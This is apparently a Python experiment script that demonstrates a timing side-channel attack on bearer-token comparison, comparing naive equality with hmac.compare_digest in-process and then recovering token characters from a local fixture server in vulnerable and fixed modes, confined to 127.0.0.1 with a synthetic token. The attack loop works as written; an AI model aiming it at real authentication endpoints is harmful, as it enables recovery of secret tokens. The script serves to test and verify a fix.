#!/usr/bin/env python3
"""Timing attack experiment: in-process timing, curl controls, HTTP timing attack, retest."""
import argparse
import datetime
import hashlib
import hmac
import http.client
import json
import platform
import secrets
import select
import shlex
import socket
import statistics
import subprocess
import sys
import time
from pathlib import Path

VERSION = "1.0.0"
ROOT = Path(__file__).resolve().parent
DELAY_MS = 2.0          # artificial per-matching-byte delay in the vulnerable server
SAMPLES = 25            # requests per candidate per position
POSITIONS = 4           # leading token characters to recover
HEX = "0123456789abcdef"
MARGIN_LIMIT_MS = DELAY_MS / 4  # fixed mode passes if no candidate stands out by this much


def now():
    return datetime.datetime.now(datetime.timezone.utc).isoformat()


def digest(path):
    return hashlib.sha256(path.read_bytes()).hexdigest()


# ---------- part A: comparison functions in-process ----------
def naive(a, b):
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        if x != y:
            return False
    return True


def time_eq(a, b, n):
    rng = range(n)
    t = time.perf_counter_ns()
    for _ in rng:
        a == b
    return (time.perf_counter_ns() - t) / n


def time_fn(fn, a, b, n):
    rng = range(n)
    t = time.perf_counter_ns()
    for _ in rng:
        fn(a, b)
    return (time.perf_counter_ns() - t) / n


def inprocess(rounds=21):
    out = {"rounds": rounds, "unit": "ns per call", "cases": []}
    for length, n, funcs in ((32, 100000, ("==", "compare_digest", "python_loop")),
                             (65536, 2000, ("==", "compare_digest"))):
        base = b"a" * length
        variants = {"mismatch_at_first_byte": b"b" + base[1:],
                    "mismatch_at_last_byte": base[:-1] + b"b",
                    "equal": bytes(bytearray(base))}
        samples = {(f, v): [] for f in funcs for v in variants}
        for _ in range(rounds):  # interleave every combination in every round
            for f in funcs:
                for v, other in variants.items():
                    a = bytes(bytearray(base))
                    if f == "==":
                        r = time_eq(a, other, n)
                    else:
                        r = time_fn(hmac.compare_digest if f == "compare_digest" else naive, a, other, n)
                    samples[(f, v)].append(r)
        for (f, v), vals in samples.items():
            q = statistics.quantiles(vals, n=4)
            out["cases"].append({"length_bytes": length, "function": f, "variant": v,
                                 "calls_per_round": n, "median_ns": round(statistics.median(vals), 2),
                                 "q1_ns": round(q[0], 2), "q3_ns": round(q[2], 2),
                                 "min_ns": round(min(vals), 2), "max_ns": round(max(vals), 2),
                                 "round_values_ns": [round(x, 2) for x in vals]})
    return out


# ---------- part B: HTTP ----------
class Conn(http.client.HTTPConnection):
    def connect(self):
        super().connect()
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)


def start_server(mode, token, delay_ms):
    cmd = [sys.executable, "-u", str(ROOT / "fixture.py"), "--mode", mode, "--port", "0",
           "--token", token, "--delay-ms", str(delay_ms)]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    ready, _, _ = select.select([proc.stdout], [], [], 5)
    if not ready:
        proc.kill()
        raise RuntimeError("Fixture did not start within five seconds")
    info = json.loads(proc.stdout.readline())
    if not info["base_url"].startswith("http://127.0.0.1:"):
        proc.kill()
        raise RuntimeError("Fixture returned a non-loopback address")
    return proc, info


def stop(proc):
    proc.terminate()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()


def attack(port, true_token, oracle_prefix):
    """Recover POSITIONS characters. Each position: SAMPLES timed requests per candidate,
    interleaved round-robin; pick the candidate with the highest median latency."""
    conn = Conn("127.0.0.1", port, timeout=5)
    known, positions = "", []
    for pos in range(POSITIONS):
        prefix = true_token[:pos] if oracle_prefix else known
        lat = {c: [] for c in HEX}
        for _ in range(SAMPLES):
            for c in HEX:
                guess = prefix + c + "z" * (len(true_token) - pos - 1)
                t = time.perf_counter_ns()
                conn.request("GET", "/api/v1/me", headers={"Authorization": "Bearer " + guess})
                r = conn.getresponse()
                r.read()
                lat[c].append((time.perf_counter_ns() - t) / 1e6)
        med = {c: statistics.median(v) for c, v in lat.items()}
        ranked = sorted(med, key=med.get, reverse=True)
        rest = [med[c] for c in ranked[1:]]
        positions.append({
            "position": pos, "prefix_used": prefix, "picked": ranked[0],
            "true_char": true_token[pos], "picked_is_true": ranked[0] == true_token[pos],
            "top_median_ms": round(med[ranked[0]], 3), "runner_up_median_ms": round(med[ranked[1]], 3),
            "median_of_other_15_ms": round(statistics.median(rest), 3),
            "margin_ms": round(med[ranked[0]] - statistics.median(rest), 3),
            "true_char_median_ms": round(med[true_token[pos]], 3),
            "true_char_rank_of_16": ranked.index(true_token[pos]) + 1,
            "medians_ms": {c: round(med[c], 3) for c in HEX},
            "raw_ms": {c: [round(x, 3) for x in lat[c]] for c in HEX}})
        known = prefix + ranked[0]
    conn.close()
    return {"recovered": known, "true_prefix": true_token[:POSITIONS],
            "all_correct": known == true_token[:POSITIONS], "positions": positions}


def curl_case(out, commands, base, name, header):
    cmd = ["curl", "--noproxy", "*", "--silent", "--show-error", "--include", "--http1.1",
           "--connect-timeout", "1", "--max-time", "3", "--request", "GET"]
    if header:
        cmd += ["--header", header]
    cmd.append(base + "/api/v1/me")
    resp = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
    status = int(resp.stdout.splitlines()[0].split()[1])
    (out / (name + ".http")).write_text(resp.stdout)
    commands.append(shlex.join(cmd))
    return status, cmd, resp


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output", type=Path, default=Path("rerun"), help="new evidence directory")
    args = parser.parse_args()
    args.output.mkdir(parents=True, exist_ok=False)
    token = secrets.token_hex(8)  # synthetic, regenerated every run
    ev = {"schema_version": 1, "fixture_version": VERSION, "started_at": now(),
          "method": "In-process timing, curl controls, and a stdlib http.client timing attack against fixture.py on 127.0.0.1",
          "parameters": {"artificial_delay_ms_per_matching_byte": DELAY_MS, "samples_per_candidate": SAMPLES,
                         "positions_attacked": POSITIONS, "alphabet": HEX,
                         "synthetic_token": token, "padding_char": "z"},
          "versions": {"python": platform.python_version(), "os": platform.system(),
                       "architecture": platform.machine(),
                       "curl": subprocess.check_output(["curl", "--version"], text=True).splitlines()[0]},
          "sha256": {n: digest(ROOT / n) for n in ("fixture.py", "verify.py")},
          "reproduction_command": "python3 verify.py --output " + shlex.quote(str(args.output)),
          "agent_execution": {"executed": False, "note": "Scripted; no model or Excession agent ran"},
          "checks": [], "failures": []}

    def check(cid, expected, observed, ok):
        ev["checks"].append({"id": cid, "expected": expected, "observed": observed, "passed": bool(ok)})
        if not ok:
            ev["failures"].append(cid)

    commands = ["#!/bin/sh", "# Recorded curl commands; rerun verify.py to start fresh servers.",
                "# Ports and the token refer to the recorded run; the servers are no longer listening."]
    procs = []
    try:
        # A: in-process
        inproc = inprocess()
        (args.output / "inprocess-timing.json").write_text(json.dumps(inproc, indent=2) + "\n")
        ev["inprocess_summary"] = [{k: c[k] for k in ("length_bytes", "function", "variant", "median_ns", "q1_ns", "q3_ns", "min_ns", "max_ns")}
                                   for c in inproc["cases"]]
        med = {(c["length_bytes"], c["function"], c["variant"]): c["median_ns"] for c in inproc["cases"]}
        ratio = med[(32, "python_loop", "mismatch_at_last_byte")] / med[(32, "python_loop", "mismatch_at_first_byte")]
        check("inprocess/python_loop-last-vs-first-ratio", "> 1.5 (positive control: method can see a real early-return effect)",
              round(ratio, 2), ratio > 1.5)

        # B: servers and curl controls
        runs = {}
        for mode in ("vulnerable", "fixed"):
            proc, info = start_server(mode, token, DELAY_MS)
            procs.append(proc)
            port = int(info["base_url"].rsplit(":", 1)[1])
            commands.append("# Server: python3 fixture.py --mode %s --port %d --token %s --delay-ms %s" % (mode, port, token, DELAY_MS))
            ctl = [("valid-token", "Authorization: Bearer " + token, 200),
                   ("wrong-token", "Authorization: Bearer " + "f" * 16, 401),
                   ("correct-prefix-wrong-rest", "Authorization: Bearer " + token[:8] + "z" * 8, 401),
                   ("no-token", None, 401)]
            for name, header, want in ctl:
                status, cmd, resp = curl_case(args.output, commands, info["base_url"], mode + "-" + name, header)
                check("curl/%s/%s" % (mode, name), want, status, status == want and resp.returncode == 0)
            runs[mode] = (proc, port)

        # C: attacks
        plan = [("vulnerable", "vulnerable-delay-2ms-greedy", False),
                ("fixed", "fixed-greedy", False),
                ("fixed", "fixed-known-prefix", True)]
        for mode, rid, oracle in plan:
            res = attack(runs[mode][1], token, oracle)
            res.update({"run_id": rid, "mode": mode, "port": runs[mode][1], "known_prefix_given_to_attacker": oracle})
            (args.output / ("attack-" + rid + ".json")).write_text(json.dumps(res, indent=2) + "\n")
            ev.setdefault("attacks", {})[rid] = {k: v for k, v in res.items() if k != "positions"}
            ev["attacks"][rid]["positions"] = [{k: v for k, v in p.items() if k not in ("medians_ms", "raw_ms")} for p in res["positions"]]
            if mode == "vulnerable":
                check("attack/%s/recovered-prefix" % rid, token[:POSITIONS], res["recovered"], res["all_correct"])
            else:
                worst = max(p["margin_ms"] for p in res["positions"])
                check("attack/%s/max-margin-below-%.2fms" % (rid, MARGIN_LIMIT_MS), "< %.2f ms at every position" % MARGIN_LIMIT_MS,
                      "%.3f ms" % worst, worst < MARGIN_LIMIT_MS)

        # natural == on loopback, no artificial delay
        stop(runs["vulnerable"][0])
        proc, info = start_server("vulnerable", token, 0)
        procs.append(proc)
        port = int(info["base_url"].rsplit(":", 1)[1])
        for rid, oracle in (("vulnerable-no-delay-greedy", False), ("vulnerable-no-delay-known-prefix", True)):
            res = attack(port, token, oracle)
            res.update({"run_id": rid, "mode": "vulnerable", "port": port, "delay_ms": 0, "known_prefix_given_to_attacker": oracle})
            (args.output / ("attack-" + rid + ".json")).write_text(json.dumps(res, indent=2) + "\n")
            ev["attacks"][rid] = {k: v for k, v in res.items() if k != "positions"}
            ev["attacks"][rid]["positions"] = [{k: v for k, v in p.items() if k not in ("medians_ms", "raw_ms")} for p in res["positions"]]
        ev["attacks"]["note"] = "No-delay runs are observations; no pass/fail is asserted for them."
    except Exception as exc:
        ev["failures"].append(type(exc).__name__ + ": " + str(exc))
    finally:
        for p in procs:
            stop(p)
    ev["finished_at"] = now()
    ev["all_checks_passed"] = not ev["failures"] and len(ev["checks"]) == 12
    (args.output / "results.json").write_text(json.dumps(ev, indent=2) + "\n")
    (args.output / "commands.sh").write_text("\n".join(commands) + "\n")
    print(json.dumps({"checks": len(ev["checks"]), "passed": ev["all_checks_passed"],
                      "failures": ev["failures"], "evidence": str(args.output / "results.json")}))
    return 0 if ev["all_checks_passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
